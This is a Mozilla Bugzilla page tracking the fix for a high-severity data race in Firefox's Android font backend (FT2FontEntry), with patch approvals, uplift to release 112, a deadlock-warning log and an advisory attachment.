* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

* [Log In](/index.cgi?GoAheadAndLogIn=1)

   Log In with GitHub

  or

  Remember me

  [Create an Account](/createaccount.cgi)
  ·
  [Forgot Password](/index.cgi?GoAheadAndLogIn=1#forgot)

* [Browse](/describecomponents.cgi "Browse bugs by component")
* [Advanced Search](/query.cgi?format=advanced "Search bugs using various criteria")
* [New Bug](/enter_bug.cgi "File a new bug")
* [Reports](/report.cgi)
* [Documentation](https://bmo.readthedocs.io/en/latest/)

Please enable JavaScript in your browser to use all the features on this site.

Copy Summary▾

* Markdown
* Markdown (bug number)
* Plain Text
* HTML

View ▾

* Reset Sections
* Expand All Sections
* Collapse All Sections
* History
* [JSON](/rest/bug/1825569)
* [XML](/show_bug.cgi?ctype=xml&id=1825569)

Closed
[Bug 1825569](/show_bug.cgi?id=1825569)

Opened 2 years ago
Closed 2 years ago

# [tsan] data races in Android font backend (FT2FontEntry)

\*
[Summary:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#short_desc)

[tsan] data races in Android font backend (FT2FontEntry)

## Categories

### (Core :: Graphics: Text, defect)

[Product:](/describecomponents.cgi?product=Core)

Core
▾

Core
Shared components used by Firefox and other Mozilla software, including handling of Web content; Gecko, HTML, CSS, layout, DOM, scripts, images, networking, etc. Issues with web page layout probably go here, while Firefox user interface issues belong in the [Firefox](https://bugzilla.mozilla.org/describecomponents.cgi?product=Firefox) product. ([More info](https://wiki.mozilla.org/Modules/All#Core))
[See Open Bugs in This Product](/buglist.cgi?product=Core&bug_status=__open__)
[File New Bug in This Product](/enter_bug.cgi?product=Core)
Watch This Product

[Component:](/describecomponents.cgi?product=Core&component=Graphics%3A%20Text#Graphics%3A%20Text)

Graphics: Text
▾

Core :: Graphics: Text

Issues with glyph rasterization and painting, font format support, and interfacing with platform font APIs. For issues with font selection, text shaping, and glyph selection, see the Layout: Text and Fonts component.

[See Open Bugs in This Component](/buglist.cgi?product=Core&component=Graphics%3A%20Text&bug_status=__open__)
[Recently Fixed Bugs in This Component](/buglist.cgi?product=Core&component=Graphics%3A%20Text&chfield=resolution&chfieldfrom=-6m&chfieldvalue=FIXED&bug_status=__closed__)
[File New Bug in This Component](/enter_bug.cgi?product=Core&component=Graphics%3A%20Text)
Watch This Component

[Version:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#version)

Firefox 113

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

All

Android

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

S3

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

RESOLVED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

113 Branch

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| a11y-review | --- |
| --- | --- |
| Accessibility Severity | --- |
| Webcompat Score | --- |
| Performance Impact | --- |
| Webcompat Priority | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr102 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=wontfix) |
| firefox111 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=wontfix) |
| firefox112 | [+](/buglist.cgi?f1=cf_tracking_firefox112&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=fixed) |
| firefox113 | [+](/buglist.cgi?f1=cf_tracking_firefox113&o1=equals&v1=%2B) | [fixed](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=fixed) |

|  | Tracking | Status |
| --- | --- | --- |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr102 |  | wontfix |
| firefox-esr115 | --- | --- |
| firefox-esr128 | --- | --- |
| firefox111 |  | wontfix |
| firefox112 | + | fixed |
| firefox113 | + | fixed |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: jfkthame, Assigned: jfkthame)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=40)  [jfkthame](/user_profile?user_id=329583)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/e0f9759e1d7514ae4adfd806869e3c5d?d=mm&size=40)  [jfkthame](/user_profile?user_id=329583)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](https://secure.gravatar.com/avatar/029a38b9773f1943419c24b7c3d93761?d=mm&size=40)  [lsalzman](/user_profile?user_id=536714)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

11 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

[1824200](/show_bug.cgi?id=1824200 "RESOLVED FIXED - [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace")

## Details

### (Keywords: csectype-race, sec-high, Whiteboard: [adv-main112+])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

---

[Keywords:](/describekeywords.cgi)

[csectype-race](/buglist.cgi?keywords=csectype-race&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[adv-main112+]

QA Whiteboard:

---

Has STR:

no

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty | ? |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |
|  | in-testsuite |  |
|  | qe-verify |  |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (2 files)

| [Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman](/attachment.cgi?id=9326035)  [2 years ago](#c2)  [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)   48 bytes, text/x-phabricator-request | diannaS : [approval-mozilla-release+](#c12 "2 years ago")  tjr : [sec-approval+](#c6 "2 years ago") | [Details](/attachment.cgi?id=9326035&action=edit) | [Review](/attachment.cgi?id=9326035) |
| --- | --- | --- |
| [advisory.txt](/attachment.cgi?id=9327570)  [2 years ago](#c14)  [Tom Ritter [:tjr]](/user_profile?user_id=578488)   12 bytes, text/plain |  | [Details](/attachment.cgi?id=9327570&action=edit) |

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1825569#c0)• 2 years ago |
|  | |

+++ This bug was initially created as a clone of [Bug #1824200](/show_bug.cgi?id=1824200 "RESOLVED FIXED - [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace") +++

Although we don't have tsan reports from Android, or known crashes occurring, examination of the Android font backend shows that it has similar data-race issues to those fixed for Linux in [bug 1824200](/show_bug.cgi?id=1824200 "RESOLVED FIXED - [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace").

Therefore, I propose to apply equivalent fixes to the gfxFT2FontList backend, and I think we should uplift them so that the Android fix ships at the same time as the Linux one.

(I guess it's possible that currently-unexplained crashes such as [bug 1825417](/show_bug.cgi?id=1825417 "RESOLVED WORKSFORME") could be related to the potential data races here, though we don't have direct evidence of that for now.)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1825569#a185_75935)• 2 years ago |

Group: core-security-release

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 1](/show_bug.cgi?id=1825569#c1)• 2 years ago |
|  | |

[Tracking Requested - why for this release]: sec-high bug that is a variation of something we're fixing in 112.

[status-firefox111](/buglist.cgi?f1=cf_status_firefox111&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox111&o1=equals&v1=wontfix)
[status-firefox112](/buglist.cgi?f1=cf_status_firefox112&o1=isnotempty):
--- → [affected](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=affected)
[tracking-firefox112](/buglist.cgi?f1=cf_tracking_firefox112&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox112&o1=equals&v1=%3F)
[tracking-firefox113](/buglist.cgi?f1=cf_tracking_firefox113&o1=isnotempty):
--- → [?](/buglist.cgi?f1=cf_tracking_firefox113&o1=equals&v1=%3F)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 2](/show_bug.cgi?id=1825569#c2)• 2 years ago |
|  | |

Attached file
[Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman](attachment.cgi?id=9326035)
— [Details](attachment.cgi?id=9326035&action=edit)

|  | [Phabricator Automation](/user_profile?user_id=600971) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1825569#a3664_600971)• 2 years ago |

Assignee: nobody → jfkthameStatus: NEW → ASSIGNED

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 3](/show_bug.cgi?id=1825569#c3)• 2 years ago |
|  | |

Comment on [attachment 9326035](/attachment.cgi?id=9326035 "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman") [[details]](/attachment.cgi?id=9326035&action=edit "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman")

[Bug 1825569](/show_bug.cgi?id=1825569 "RESOLVED FIXED - [tsan] data races in Android font backend (FT2FontEntry)") - Atomics/locking in FT2FontEntry. r=lsalzman

### Security Approval Request

* **How easily could an exploit be constructed based on the patch?**: Not easily, I guess - the fact that we're adding locking and atomics suggests a thread-related issue, but it's unclear how to reliably trigger a data race, or to exploit it if it happens.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which older supported branches are affected by this flaw?**: 105+
* **If not all supported branches, which bug introduced the flaw?**: None
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: Should be trivial
* **How likely is this patch to cause regressions; how much testing does it need?**: Low risk - Android version of fixes applied to the Linux backend in [bug 1824200](/show_bug.cgi?id=1824200 "RESOLVED FIXED - [tsan] data race initializing the SharedFTFace in gfxFontconfigFontEntry::GetFTFace") (and verified by tsan there)
* **Is Android affected?**: Yes

### Beta/Release Uplift Approval Request

* **User impact if declined**: Potential data races in font code, could result in crashes, wild-ptr access, or similar
* **Is this code covered by automated tests?**: Yes
* **Has the fix been verified in Nightly?**: No
* **Needs manual test from QE?**: No
* **If yes, steps to reproduce**: No known STR
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: Similar fixes successfully landed (and checked with tsan) in Linux backend
* **String changes made/needed**: none
* **Is Android affected?**: Yes
[Attachment #9326035](/attachment.cgi?id=9326035&action=edit "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman") -
Flags: sec-approval?
[Attachment #9326035](/attachment.cgi?id=9326035&action=edit "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman") -
Flags: approval-mozilla-beta?

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1825569#a5682_75935)• 2 years ago |

[status-firefox-esr102](/buglist.cgi?f1=cf_status_firefox_esr102&o1=isnotempty):
--- → [wontfix](/buglist.cgi?f1=cf_status_firefox_esr102&o1=equals&v1=wontfix)
[tracking-firefox112](/buglist.cgi?f1=cf_tracking_firefox112&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox112&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox112&o1=equals&v1=%2B)
[tracking-firefox113](/buglist.cgi?f1=cf_tracking_firefox113&o1=isnotempty):
[?](/buglist.cgi?f1=cf_tracking_firefox113&o1=equals&v1=%3F) → [+](/buglist.cgi?f1=cf_tracking_firefox113&o1=equals&v1=%2B)

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Comment 4](/show_bug.cgi?id=1825569#c4)• 2 years ago |
|  | |

The severity field for this bug is set to S3. However, the bug is flagged with the `sec-high` keyword.

:jfkthame, could you consider increasing the severity of this security bug?

For more information, please visit [auto\_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#severity_high_security.py).

Flags: needinfo?(jfkthame)

|  | [BugBot [:suhaib / :marco/ :calixte]](/user_profile?user_id=575867) |  |
| --- | --- | --- |
| [Comment 5](/show_bug.cgi?id=1825569#c5)• 2 years ago |
|  | |

The bug is marked as tracked for firefox112 (beta) and tracked for firefox113 (nightly). However, the bug still has low severity.

:bhood, could you please increase the severity for this tracked bug? If you disagree with the tracking decision, please talk with the release managers.

For more information, please visit [auto\_nag documentation](https://wiki.mozilla.org/Release_Management/autonag#tracked_attention.py).

Flags: needinfo?(bhood)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 6](/show_bug.cgi?id=1825569#c6)• 2 years ago |
|  | |

Comment on [attachment 9326035](/attachment.cgi?id=9326035 "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman") [[details]](/attachment.cgi?id=9326035&action=edit "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman")

[Bug 1825569](/show_bug.cgi?id=1825569 "RESOLVED FIXED - [tsan] data races in Android font backend (FT2FontEntry)") - Atomics/locking in FT2FontEntry. r=lsalzman

sec approved to land today; Relman said they would uplift it next week after it bakes over the weekend

[Attachment #9326035](/attachment.cgi?id=9326035&action=edit "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman") -
Flags: sec-approval? → sec-approval+

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1825569#a87342_75935)• 2 years ago |

Flags: needinfo?(jfkthame)Flags: needinfo?(bhood)

|  | [Ryan VanderMeulen [:RyanVM]](/user_profile?user_id=75935) |  |
| --- | --- | --- |
| [Comment 7](/show_bug.cgi?id=1825569#c7)• 2 years ago |
|  | |

I was looking at the logcat for a debug test run and saw a lot of logspew like this:

```
03-31 15:12:40.440  3624  3639 I Gecko   : [Child 3624, Main Thread] WARNING: Potential deadlock detected:
03-31 15:12:40.440  3624  3639 I Gecko   : Cyclical dependency starts at
03-31 15:12:40.440  3624  3639 I Gecko   : Mutex : gfxFontEntry lock
03-31 15:12:40.440  3624  3639 I Gecko   : Next dependency:
03-31 15:12:40.440  3624  3639 I Gecko   : Mutex : SharedFTFace::mLock (currently acquired)
03-31 15:12:40.440  3624  3639 I Gecko   : Cycle completed at
03-31 15:12:40.440  3624  3639 I Gecko   : Mutex : gfxFontEntry lock
03-31 15:12:40.440  3624  3639 I Gecko   : Deadlock may happen for some other execution

```

Is that cause for concern?

Flags: needinfo?(jfkthame)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 8](/show_bug.cgi?id=1825569#c8)• 2 years ago |
|  | |

Hmm, will take a look - thanks.

|  | [Andrew McCreight [:mccr8]](/user_profile?user_id=406194) |  |
| --- | --- | --- |
| [Comment 9](/show_bug.cgi?id=1825569#c9)• 2 years ago • [Edited](/page.cgi?id=comment-revisions.html&bug_id=1825569&comment_id=16352166 "1 revision") |
|  | |

FWIW, I've locally seen something similar to that for awhile. (on OSX)

|  | [Sebastian Hengst [:aryx] (needinfo me if it's about an intermittent or backout)](/user_profile?user_id=258347) |  |
| --- | --- | --- |
| [Comment 10](/show_bug.cgi?id=1825569#c10)• 2 years ago |
|  | |

Atomics/locking in FT2FontEntry. r=lsalzman

<https://hg.mozilla.org/integration/autoland/rev/2a1fc04f9a8cee1868ccd5096ea89317578053eb>

<https://hg.mozilla.org/mozilla-central/rev/2a1fc04f9a8c>

Group: gfx-core-security → core-security-releaseStatus: ASSIGNED → RESOLVEDClosed: 2 years ago
[status-firefox113](/buglist.cgi?f1=cf_status_firefox113&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox113&o1=equals&v1=fixed)Resolution: --- → FIXEDTarget Milestone: --- → 113 Branch

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Comment 11](/show_bug.cgi?id=1825569#c11)• 2 years ago |
|  | |

Comment on [attachment 9326035](/attachment.cgi?id=9326035 "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman") [[details]](/attachment.cgi?id=9326035&action=edit "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman")

[Bug 1825569](/show_bug.cgi?id=1825569 "RESOLVED FIXED - [tsan] data races in Android font backend (FT2FontEntry)") - Atomics/locking in FT2FontEntry. r=lsalzman

Approved for 112.0rc1

[Attachment #9326035](/attachment.cgi?id=9326035&action=edit "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman") -
Flags: approval-mozilla-beta? → approval-mozilla-beta+

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Comment 12](/show_bug.cgi?id=1825569#c12)• 2 years ago |
|  | |

Comment on [attachment 9326035](/attachment.cgi?id=9326035 "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman") [[details]](/attachment.cgi?id=9326035&action=edit "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman")

[Bug 1825569](/show_bug.cgi?id=1825569 "RESOLVED FIXED - [tsan] data races in Android font backend (FT2FontEntry)") - Atomics/locking in FT2FontEntry. r=lsalzman

switching flag since the merge to release already happened

[Attachment #9326035](/attachment.cgi?id=9326035&action=edit "Bug 1825569 - Atomics/locking in FT2FontEntry. r=lsalzman") -
Flags: approval-mozilla-beta+ → approval-mozilla-release+

|  | [Dianna Smith [:diannaS]](/user_profile?user_id=690067) |  |
| --- | --- | --- |
| [Comment 13](/show_bug.cgi?id=1825569#c13)• 2 years ago |
| uplift | |

<https://hg.mozilla.org/releases/mozilla-release/rev/3a27c8622dba>

[status-firefox112](/buglist.cgi?f1=cf_status_firefox112&o1=isnotempty):
[affected](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=affected) → [fixed](/buglist.cgi?f1=cf_status_firefox112&o1=equals&v1=fixed)

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1825569#a518013_578488)• 2 years ago |

Whiteboard: [adv-main112+]

|  | [Tom Ritter [:tjr]](/user_profile?user_id=578488) |  |
| --- | --- | --- |
| [Comment 14](/show_bug.cgi?id=1825569#c14)• 2 years ago |
|  | |

Attached file
[advisory.txt](attachment.cgi?id=9327570)
— [Details](attachment.cgi?id=9327570&action=edit)

|  | [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)  Assignee |  |
| --- | --- | --- |
| [Comment 15](/show_bug.cgi?id=1825569#c15)• 2 years ago |
|  | |

(In reply to [PTO until 26-June] Ryan VanderMeulen [:RyanVM] from [comment #7](/show_bug.cgi?id=1825569#c7 "RESOLVED FIXED - [tsan] data races in Android font backend (FT2FontEntry)"))

> I was looking at the logcat for a debug test run and saw a lot of logspew like this:
>
> ```
> 03-31 15:12:40.440  3624  3639 I Gecko   : [Child 3624, Main Thread] WARNING: Potential deadlock detected:
> 03-31 15:12:40.440  3624  3639 I Gecko   : Cyclical dependency starts at
> 03-31 15:12:40.440  3624  3639 I Gecko   : Mutex : gfxFontEntry lock
> 03-31 15:12:40.440  3624  3639 I Gecko   : Next dependency:
> 03-31 15:12:40.440  3624  3639 I Gecko   : Mutex : SharedFTFace::mLock (currently acquired)
> 03-31 15:12:40.440  3624  3639 I Gecko   : Cycle completed at
> 03-31 15:12:40.440  3624  3639 I Gecko   : Mutex : gfxFontEntry lock
> 03-31 15:12:40.440  3624  3639 I Gecko   : Deadlock may happen for some other execution
>
> ```
>
> Is that cause for concern?

That looks like [bug 1835110](/show_bug.cgi?id=1835110 "RESOLVED FIXED - Warnings of potential deadlock in Android font backend"), which was fixed a little while ago.

Flags: needinfo?(jfkthame)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1825569#a17410902_1689)• 1 year ago |

Group: core-security-release
You need to [log in](/show_bug.cgi?id=1825569&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Jonathan Kew [:jfkthame]](/user_profile?user_id=329583)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review


